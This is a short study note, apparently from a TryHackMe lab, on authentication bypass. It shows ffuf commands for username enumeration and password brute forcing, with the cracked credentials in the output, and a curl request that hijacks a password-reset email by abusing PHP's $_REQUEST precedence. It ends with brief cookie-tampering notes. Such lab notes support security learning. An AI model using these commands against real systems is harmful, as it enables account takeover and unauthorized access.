# Vulnerability

## Authentication Bypass
### Username Enumeration
```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.0/customers/signup -mr "username already exists"
```  
`-w` : usernamelist, `-X` : request method, `-d` : sending data, `FUZZ` : contents from wordlist, `-H` : additonal header, `-u` : target url, `-mr` : the text on the page we are looking for to validate we've found a valid username.  
`> valid_usernames.txt` : add the usernames that you found using ffuf.  

### Brute Force
Password Crack
```
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.0/customers/login -fc 200
.
.
.
:: Progress: [355/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder
```  

### Logic Flaw
A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.  
<img src="https://github.com/nkn-ctrl/pushtest/blob/main/vul_logicflaw.png" width="500">
```
user@tryhackme$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```  

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.  
The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data.  If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

## Cookie Tampering
- Plain Text
- Hashing
    https://crackstation.net/ keep databases of billions of hashes and their original strings.
- Encoding






